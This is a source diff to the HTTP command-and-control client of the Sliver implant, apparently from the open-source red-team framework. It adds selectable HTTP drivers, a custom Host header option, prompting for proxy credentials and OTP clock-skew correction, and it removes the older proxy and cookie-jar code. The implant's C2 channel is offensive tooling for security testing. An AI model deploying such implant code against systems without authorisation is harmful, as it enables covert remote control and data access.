@@ -23,13 +23,11 @@ package httpclient
 import (
 	"bytes"
 	"context"
-	"crypto/tls"
 	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
 	insecureRand "math/rand"
-	"net"
 	"net/http"
 	"net/url"
 	"strconv"
@@ -44,12 +42,14 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
-	"github.com/bishopfox/sliver/implant/sliver/proxy"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
 const (
+	goHTTPDriver  = "go"
+	wininetDriver = "wininet"
+
 	userAgent         = "{{GenerateUserAgent}}"
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
@@ -58,10 +58,12 @@ const (
 var (
 	ErrClosed               = errors.New("http session closed")
 	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
+	TimeDelta time.Duration = 0
 )
 
 // HTTPOptions - c2 specific configuration options
 type HTTPOptions struct {
+	Driver               string
 	NetTimeout           time.Duration
 	TlsTimeout           time.Duration
 	PollTimeout          time.Duration
@@ -69,10 +71,12 @@ type HTTPOptions struct {
 	ForceHTTP            bool
 	DisableAcceptHeader  bool
 	DisableUpgradeHeader bool
+	HostHeader           string
 
 	ProxyConfig   string
 	ProxyUsername string
 	ProxyPassword string
+	AskProxyCreds bool
 }
 
 // ParseHTTPOptions - Parse c2 specific configuration options
@@ -93,7 +97,13 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 	if err != nil || maxErrors < 0 {
 		maxErrors = 10
 	}
+	driverName := strings.TrimSpace(strings.ToLower(c2URI.Query().Get("driver")))
+	if driverName == "" {
+		driverName = goHTTPDriver
+	}
+
 	return &HTTPOptions{
+		Driver:               driverName,
 		NetTimeout:           netTimeout,
 		TlsTimeout:           tlsTimeout,
 		PollTimeout:          pollTimeout,
@@ -101,10 +111,12 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
 		DisableAcceptHeader:  c2URI.Query().Get("disable-accept-header") == "true",
 		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
+		HostHeader:           c2URI.Query().Get("host-header"),
 
 		ProxyConfig:   c2URI.Query().Get("proxy"),
 		ProxyUsername: c2URI.Query().Get("proxy-username"),
 		ProxyPassword: c2URI.Query().Get("proxy-password"),
+		AskProxyCreds: c2URI.Query().Get("ask-proxy-creds") == "true",
 	}
 }
 
@@ -113,7 +125,7 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 	var client *SliverHTTPClient
 	var err error
 	if !opts.ForceHTTP {
-		client = httpsClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig)
+		client = httpsClient(address, opts)
 		client.Options = opts
 		client.PathPrefix = pathPrefix
 		err = client.SessionInit()
@@ -126,7 +138,8 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
-		client = httpClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig) // Fallback to insecure HTTP
+
+		client = httpClient(address, opts) // Fallback to insecure HTTP
 		client.Options = opts
 		client.PathPrefix = pathPrefix
 		err = client.SessionInit()
@@ -137,17 +150,23 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 	return client, nil
 }
 
+// HTTPDriver - The interface to send/recv HTTP data
+type HTTPDriver interface {
+	Do(*http.Request) (*http.Response, error)
+}
+
 // SliverHTTPClient - Helper struct to keep everything together
 type SliverHTTPClient struct {
-	Origin     string
-	PathPrefix string
-	Client     *http.Client
-	ProxyURL   string
-	SessionCtx *cryptography.CipherContext
-	SessionID  string
-	pollCancel context.CancelFunc
-	pollMutex  *sync.Mutex
-	Closed     bool
+	Origin      string
+	PathPrefix  string
+	driver      HTTPDriver
+	ProxyURL    string
+	SessionCtx  *cryptography.CipherContext
+	SessionID   string
+	pollTimeout time.Duration
+	pollCancel  context.CancelFunc
+	pollMutex   *sync.Mutex
+	Closed      bool
 
 	Options *HTTPOptions
 }
@@ -205,6 +224,9 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
+	if s.Options.HostHeader != "" {
+		req.Host = s.Options.HostHeader
+	}
 	req.Header.Set("User-Agent", userAgent)
 	if method == http.MethodGet && !s.Options.DisableAcceptHeader {
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
@@ -279,7 +301,7 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 	var data []byte
 	var err error
 	go func() {
-		resp, err = s.Client.Do(req.WithContext(ctx))
+		resp, err = s.driver.Do(req.WithContext(ctx))
 		select {
 		case <-ctx.Done():
 			done <- ctx.Err()
@@ -313,14 +335,15 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 
 	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
-	otpCode := cryptography.GetOTPCode()
+	timestamp := time.Now().UTC().Add(TimeDelta)
+	otpCode := cryptography.GetExactOTPCode(timestamp)
 	s.OTPQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
 	// {{end}}
 
-	resp, err := s.Client.Do(req)
+	resp, err := s.driver.Do(req)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] http response error: %s", err)
@@ -328,6 +351,15 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 		return err
 	}
 	if resp.StatusCode != http.StatusOK {
+		serverDateHeader := resp.Header.Get("Date")
+		if serverDateHeader != "" {
+				// If the request failed and there is a Date header, find the time difference and save it for the next request
+				curTime := time.Now().UTC()
+				serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
+				if err == nil {
+					TimeDelta = serverTime.UTC().Sub(curTime)
+				}
+		}
 		// {{if .Config.Debug}}
 		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
 		// {{end}}
@@ -455,7 +487,7 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	// {{end}}
 
 	req := s.newHTTPRequest(http.MethodPost, uri, reader)
-	resp, err := s.Client.Do(req)
+	resp, err := s.driver.Do(req)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST request completed")
 	// {{end}}
@@ -499,7 +531,7 @@ func (s *SliverHTTPClient) CloseSession() error {
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	resp, err := s.Client.Do(req)
+	resp, err := s.driver.Do(req)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] GET failed %v", err)
@@ -609,123 +641,42 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
 
-func httpClient(address string, netTimeout time.Duration, tlsTimeout time.Duration, proxyConfig string) *SliverHTTPClient {
-	transport := &http.Transport{
-		Dial:                proxy.Direct.Dial,
-		TLSHandshakeTimeout: tlsTimeout,
-		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
+func httpClient(address string, opts *HTTPOptions) *SliverHTTPClient {
+	origin := fmt.Sprintf("http://%s", address)
+	driver, err := GetHTTPDriver(origin, false, opts)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to initialize driver: %v", err)
+		// {{end}}
+		return nil
 	}
 	client := &SliverHTTPClient{
-		Origin: fmt.Sprintf("http://%s", address),
-		Client: &http.Client{
-			Jar:       cookieJar(),
-			Timeout:   netTimeout,
-			Transport: transport,
-		},
+		Origin:    origin,
+		driver:    driver,
 		pollMutex: &sync.Mutex{},
 		Closed:    false,
+		Options:   opts,
 	}
-	parseProxyConfig(client, transport, proxyConfig)
 	return client
 }
 
-func httpsClient(address string, netTimeout time.Duration, tlsTimeout time.Duration, proxyConfig string) *SliverHTTPClient {
-	transport := &http.Transport{
-		IdleConnTimeout: time.Millisecond,
-		Dial: (&net.Dialer{
-			Timeout: netTimeout,
-		}).Dial,
-		TLSHandshakeTimeout: tlsTimeout,
-		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
+func httpsClient(address string, opts *HTTPOptions) *SliverHTTPClient {
+	origin := fmt.Sprintf("https://%s", address)
+	driver, err := GetHTTPDriver(origin, true, opts)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to initialize driver: %v", err)
+		// {{end}}
+		return nil
 	}
 	client := &SliverHTTPClient{
-		Origin: fmt.Sprintf("https://%s", address),
-		Client: &http.Client{
-			Jar:       cookieJar(),
-			Timeout:   netTimeout,
-			Transport: transport,
-		},
+		Origin:    origin,
+		driver:    driver,
 		pollMutex: &sync.Mutex{},
 		Closed:    false,
+		Options:   opts,
 	}
-	parseProxyConfig(client, transport, proxyConfig)
 	return client
-}
-
-func parseProxyConfig(client *SliverHTTPClient, transport *http.Transport, proxyConfig string) {
-	switch proxyConfig {
-	case "never":
-		break
-	case "":
-		fallthrough
-	case "auto":
-		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
-		if p != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Found proxy %#v\n", p)
-			// {{end}}
-			proxyURL := p.URL()
-			if proxyURL.Scheme == "" {
-				proxyURL.Scheme = "https"
-			}
-			// {{if .Config.Debug}}
-			log.Printf("Proxy URL = '%s'\n", proxyURL)
-			// {{end}}
-			transport.Proxy = http.ProxyURL(proxyURL)
-			client.ProxyURL = proxyURL.String()
-		}
-	default:
-		// {{if .Config.Debug}}
-		log.Printf("Force proxy %#v\n", proxyConfig)
-		// {{end}}
-		proxyURL, err := url.Parse(proxyConfig)
-		if err != nil {
-			break
-		}
-		if proxyURL.Scheme == "" {
-			proxyURL.Scheme = "https"
-		}
-		// {{if .Config.Debug}}
-		log.Printf("Proxy URL = '%s'\n", proxyURL)
-		// {{end}}
-		transport.Proxy = http.ProxyURL(proxyURL)
-		client.ProxyURL = proxyURL.String()
-	}
-}
-
-// Jar - CookieJar implementation that ignores domains/origins
-type Jar struct {
-	lk      sync.Mutex
-	cookies []*http.Cookie
-}
-
-func cookieJar() *Jar {
-	return &Jar{
-		lk:      sync.Mutex{},
-		cookies: []*http.Cookie{},
-	}
-}
-
-// NewJar - Get a new instance of a cookie jar
-func NewJar() *Jar {
-	jar := new(Jar)
-	jar.cookies = make([]*http.Cookie, 0)
-	return jar
-}
-
-// SetCookies handles the receipt of the cookies in a reply for the
-// given URL (which is ignored).
-func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
-	jar.lk.Lock()
-	jar.cookies = append(jar.cookies, cookies...)
-	jar.lk.Unlock()
-}
-
-// Cookies returns the cookies to send in a request for the given URL.
-// It is up to the implementation to honor the standard cookie use
-// restrictions such as in RFC 6265 (which we do not).
-func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
-	return jar.cookies
 }
 
 // {{end}} -HTTPc2Enabled
